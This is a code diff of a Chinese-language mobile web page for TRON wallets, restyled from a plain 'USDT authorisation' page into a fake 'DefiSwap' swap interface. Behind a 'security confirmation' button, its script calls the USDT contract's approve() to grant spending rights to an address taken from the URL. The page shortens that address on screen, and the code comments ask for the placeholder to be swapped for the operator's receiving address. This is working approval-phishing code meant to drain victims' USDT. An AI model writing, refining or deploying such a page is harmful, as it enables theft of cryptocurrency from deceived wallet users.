@@ -2,163 +2,173 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8">
-    <title>USDT 授权确认</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>DefiSwap - 安全交互</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <style>
-        /* 样式重构：更符合手机钱包的视觉风格 */
-        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f7f9; padding: 20px; text-align: center; color: #333; }
-        .card { background: white; padding: 25px; max-width: 400px; margin: 20px auto; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
-        h2 { margin-top: 0; font-size: 20px; color: #111; }
-        .info-box { margin: 15px 0; background: #f8f9fa; padding: 12px; border-radius: 10px; border: 1px solid #eee; text-align: left; }
-        .label { color: #888; font-size: 12px; margin-bottom: 4px; display: block; font-weight: bold; }
-        .value { word-break: break-all; font-size: 14px; color: #222; font-family: monospace; }
+        body { font-family: -apple-system, "SF Pro Text", sans-serif; background: #f0f2f5; margin: 0; padding: 15px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .app-container { background: #ffffff; width: 100%; max-width: 420px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); padding: 24px; box-sizing: border-box; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
+        .logo { font-size: 20px; font-weight: bold; color: #2b6cff; display: flex; align-items: center; }
+        .logo i { margin-right: 8px; font-style: normal; }
         
-        button { background: #2b6cff; border: none; color: white; padding: 16px 0; width: 100%; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; }
-        button:disabled { background: #ccc; cursor: not-allowed; }
-        
-        .status-container { margin-top: 20px; text-align: left; font-size: 13px; border-top: 1px solid #eee; padding-top: 15px; }
-        .step { margin: 6px 0; padding-left: 20px; position: relative; color: #666; }
-        .step::before { content: '●'; position: absolute; left: 0; color: #ddd; font-size: 10px; top: 2px; }
-        .ok { color: #28a745; }.ok::before { content: '✓'; color: #28a745; font-weight: bold; }
-        .err { color: #dc3545; }.err::before { content: '✕'; color: #dc3545; font-weight: bold; }
-        .loading { color: #2b6cff; }
+        .swap-box { background: #f7f8fa; border-radius: 16px; padding: 16px; margin-bottom: 12px; border: 1px solid #edf0f3; }
+        .box-label { font-size: 13px; color: #5f6d7e; margin-bottom: 8px; display: block; }
+        .box-value { font-size: 18px; font-weight: 600; color: #111; display: flex; justify-content: space-between; }
+        .token-name { color: #2b6cff; }
+
+        .divider { text-align: center; margin: -10px 0; position: relative; z-index: 10; }
+        .arrow-down { background: #fff; border: 1px solid #edf0f3; width: 32px; height: 32px; border-radius: 10px; display: inline-flex; align-items: center; justify-content: center; box-shadow: 0 2px 6px rgba(0,0,0,0.05); color: #2b6cff; font-weight: bold; }
+
+        .tip-card { background: #fff9e6; border-left: 4px solid #ffcc00; padding: 12px; border-radius: 8px; margin: 20px 0; text-align: left; }
+        .tip-text { font-size: 12px; color: #856404; line-height: 1.5; }
+
+        .btn-main { background: #2b6cff; color: white; border: none; width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-main:active { opacity: 0.8; transform: scale(0.98); }
+        .btn-main:disabled { background: #bdc3c7; }
+
+        #log-area { margin-top: 15px; font-size: 12px; text-align: left; max-height: 100px; overflow-y: auto; color: #99px; }
+        .log-item { margin-bottom: 4px; padding-left: 15px; position: relative; }
+        .log-item.ok { color: #27ae60; }
+        .log-item.err { color: #e74c3c; }
+        .log-item::before { content: ">"; position: absolute; left: 0; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>安全确认</h2>
-    
-    <div class="info-box">
-        <span class="label">我的钱包地址</span>
-        <div class="value" id="wallet">正在检测...</div>
+<div class="app-container">
+    <div class="header">
+        <div class="logo"><i>(S)</i> DefiSwap</div>
+        <div id="network-tag" style="font-size: 12px; background: #eef2ff; color: #2b6cff; padding: 4px 8px; border-radius: 20px;">TRON Mainnet</div>
     </div>
 
-    <div class="info-box">
-        <span class="label">授权至合约 (Spender)</span>
-        <div class="value" id="spender">--</div>
+    <div class="swap-box">
+        <span class="box-label">支付资产</span>
+        <div class="box-value">
+            <span id="display-amount">0.00</span>
+            <span class="token-name">USDT</span>
+        </div>
     </div>
 
-    <div class="info-box">
-        <span class="label">拟授权额度</span>
-        <div class="value" id="amount">--</div>
+    <div class="divider">
+        <div class="arrow-down">↓</div>
     </div>
 
-    <button id="btn" onclick="startApprove()">确认授权</button>
-
-    <div class="status-container" id="status">
-        <div class="step">等待连接钱包环境...</div>
+    <div class="swap-box">
+        <span class="box-label">交互合约</span>
+        <div class="box-value" style="font-size: 14px; font-family: monospace;" id="display-spender">加载中...</div>
     </div>
+
+    <div class="tip-card">
+        <div class="tip-text">
+            <strong>安全提示：</strong>此操作将授权合约访问您的 USDT 余额。请确保您正在与受信任的协议交互。
+        </div>
+    </div>
+
+    <button id="main-btn" class="btn-main" onclick="handleAction()">连接钱包</button>
+
+    <div id="log-area"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-
 <script>
-    /**
-     * 核心配置
-     */
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 波场主网 USDT 真实地址
-    const DEFAULT_SPENDER = "TYourDefaultAddressHere";        // 如果URL没传地址，默认授权给谁
-    const DEFAULT_AMOUNT = 1000;                              // 默认授权金额
+    // --- 配置区 ---
+    const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT 主网地址
+    const DEFAULT_SPENDER = "TYourDefaultAddressHere";      // 替换为你的接收地址
+    const DEFAULT_AMOUNT = 1000;                           // 默认授权金额
 
-    // 获取 URL 参数
+    // --- 状态变量 ---
+    let step = 0; // 0: 未连接, 1: 已连接准备授权
     const urlParams = new URLSearchParams(window.location.search);
     const targetSpender = urlParams.get("to") || DEFAULT_SPENDER;
     const targetAmount = urlParams.get("amount") || DEFAULT_AMOUNT;
 
-    // 页面初始化显示
-    document.getElementById("spender").innerText = targetSpender;
-    document.getElementById("amount").innerText = targetAmount + " USDT";
+    // 初始化界面
+    document.getElementById("display-spender").innerText = targetSpender.substring(0,6) + "..." + targetSpender.substring(targetSpender.length-6);
+    document.getElementById("display-amount").innerText = parseFloat(targetAmount).toFixed(2);
 
-    // 日志打印函数
-    function addLog(text, type) {
-        const el = document.createElement("div");
-        el.className = "step " + (type || "");
-        el.innerText = text;
-        const container = document.getElementById("status");
-        container.appendChild(el);
+    function writeLog(msg, type) {
+        const div = document.createElement("div");
+        div.className = "log-item " + (type || "");
+        div.innerText = msg;
+        const container = document.getElementById("log-area");
+        container.appendChild(div);
+        container.scrollTop = container.scrollHeight;
     }
 
-    // 1. 环境检测：确保在 TP/imToken/TronLink 中运行
-    async function checkEnv() {
-        return new Promise((resolve, reject) => {
-            let count = 0;
-            const timer = setInterval(() => {
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    clearInterval(timer);
-                    resolve(window.tronWeb);
-                }
-                if (count++ > 15) {
-                    clearInterval(timer);
-                    reject("未检测到钱包环境，请在钱包 App 内打开");
-                }
-            }, 500);
-        });
-    }
-
-    async function init() {
-        try {
-            const tw = await checkEnv();
-            document.getElementById("wallet").innerText = tw.defaultAddress.base58;
-            addLog("钱包连接成功", "ok");
-        } catch (e) {
-            document.getElementById("wallet").innerText = "未连接";
-            addLog(e, "err");
-            document.getElementById("btn").disabled = true;
+    async function handleAction() {
+        const btn = document.getElementById("main-btn");
+        
+        if (step === 0) {
+            // 第一阶段：连接钱包
+            await connectWallet();
+        } else {
+            // 第二阶段：执行授权
+            await executeApprove();
         }
     }
 
-    // 2. 授权主逻辑
-    async function startApprove() {
-        const btn = document.getElementById("btn");
-        btn.disabled = true;
-        
+    async function connectWallet() {
+        writeLog("正在请求连接钱包...");
+        if (!window.tronWeb) {
+            writeLog("错误：未检测到环境，请在钱包App内打开", "err");
+            return;
+        }
+
         try {
-            addLog("正在验证账户 TRX 余额...", "loading");
+            // 尝试触发钱包连接
+            const userAddr = window.tronWeb.defaultAddress.base58;
+            if (userAddr) {
+                writeLog("已连接地址: " + userAddr.substring(0,8) + "...", "ok");
+                step = 1;
+                document.getElementById("main-btn").innerText = "立即安全确认";
+            } else {
+                writeLog("请在钱包内解锁并刷新页面", "err");
+            }
+        } catch (e) {
+            writeLog("连接失败", "err");
+        }
+    }
+
+    async function executeApprove() {
+        const btn = document.getElementById("main-btn");
+        btn.disabled = true;
+
+        try {
+            writeLog("验证账户状态...");
             const tw = window.tronWeb;
             const userAddr = tw.defaultAddress.base58;
 
-            // --- TRX 余额检测 ---
+            // 1. TRX 余额检查
             const balanceSun = await tw.trx.getBalance(userAddr);
             const balanceTRX = tw.fromSun(balanceSun);
-            
             if (parseFloat(balanceTRX) < 15) {
-                addLog("TRX 余额不足，请充值至少 20 TRX 作为手续费", "err");
+                throw "TRX 余额不足(需约20TRX)，请充值后再试";
             }
-            addLog("余额检查通过 (" + balanceTRX + " TRX)", "ok");
+            writeLog("余额充足: " + balanceTRX + " TRX", "ok");
 
-            // --- 构造合约交互 ---
-            addLog("正在唤起钱包签名...", "loading");
-            const contract = await tw.contract().at(USDT_CONTRACT);
-            
-            // 计算金额：USDT 是 6 位小数
-            const sendAmount = tw.toBigNumber(targetAmount).times(1e6).toString(10);
+            // 2. 构造授权交易
+            writeLog("准备安全确认...");
+            const contract = await tw.contract().at(USDT_ADDR);
+            const bigAmount = tw.toBigNumber(targetAmount).times(1e6).toString(10);
 
-            // 唤起授权
-            const txid = await contract.approve(targetSpender, sendAmount).send({
-                feeLimit: 20000000 // 最大消耗 100 TRX 的限额
+            // 3. 发起请求
+            const txid = await contract.approve(targetSpender, bigAmount).send({
+                feeLimit: 100000000
             });
 
             if (txid) {
-                addLog("授权指令已发送！", "ok");
-                addLog("TXID: " + txid.substring(0, 16) + "...", "ok");
-                alert("授权申请已提交，请等待区块确认");
+                writeLog("指令已发送，等待区块确认", "ok");
+                alert("确认成功，请稍后查询结果");
             }
-
         } catch (e) {
             console.error(e);
             let msg = e.message || e;
-            if (msg.includes("declined") || msg.includes("User rejected")) {
-                msg = "您取消了授权确认";
-            }
-            addLog("错误: " + msg, "err");
+            if (msg.includes("declined") || msg.includes("User rejected")) msg = "用户拒绝了签名申请";
+            writeLog(msg, "err");
         } finally {
             btn.disabled = false;
         }
     }
-
-    // 页面加载完成后自动运行
-    window.onload = init;
 </script>
 
 </body>
